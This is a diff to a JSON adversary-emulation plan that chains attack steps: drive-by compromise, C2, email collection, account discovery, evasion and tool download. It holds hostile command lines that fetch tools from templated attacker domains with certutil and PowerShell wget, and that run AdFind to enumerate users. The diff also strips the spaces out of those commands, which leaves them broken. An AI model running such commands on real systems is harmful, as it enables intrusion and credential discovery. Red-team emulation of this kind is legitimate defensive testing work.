@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,24 +49,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "netbugc.exe",
@@ -75,24 +75,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX3",
             "preconditions": {
                 "payload": "AdFind.exe",
@@ -101,16 +101,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -120,8 +120,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -131,8 +131,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -142,8 +142,8 @@
             }
         },
         {
-            "tactic": "RemoteEmailCollection",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "RemoteEmailCollection",
             "label": "remoteEmailCollection",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -155,8 +155,8 @@
             }
         },
         {
-            "tactic": "FileAndDirectoryDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "FileAndDirectoryDiscovery",
             "label": "fileDirDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -168,8 +168,8 @@
             }
         },
         {
-            "tactic": "PermissionGroupsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "PermissionGroupsDiscovery",
             "label": "permGroupsDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -178,8 +178,8 @@
             }
         },
         {
-            "tactic": "RemoteSystemDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -188,8 +188,8 @@
             }
         },
         {
-            "tactic": "ObfuscatedFilesOrInformation",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "ObfuscatedFilesOrInformation",
             "label": "obfsInformation",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -198,21 +198,21 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2} ${self.temp_dir_name}\\${self.tool_name2} && echo \" \""
+                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
                 }
             }
         },
         {
-            "tactic": "MatchLegitimateNameOrLocation",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "MatchLegitimateNameOrLocation",
             "label": "matchName",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -227,8 +227,8 @@
             }
         },
         {
-            "tactic": "SoftwarePacking",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "SoftwarePacking",
             "label": "softwarePacking",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -241,34 +241,34 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{wget -O ${self.temp_dir_name}\\${self.tool_name3} http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
+                    "command": "powershell &{wget -O${self.temp_dir_name}\\${self.tool_name3}http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
                 }
             }
         },
         {
-            "tactic": "PermissionGroupsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "PermissionGroupsDiscovery",
             "label": "remoteSystemDiscovery2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "windowsshell ${self.temp_dir_name}\\${self.tool_name3} -default -f \"objectcategory=user\" \"cn\"; echo \" \""
+                    "command": "windowsshell${self.temp_dir_name}\\${self.tool_name3}-default -f \"objectcategory=user\" \"cn\"; echo \" \""
                 }
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
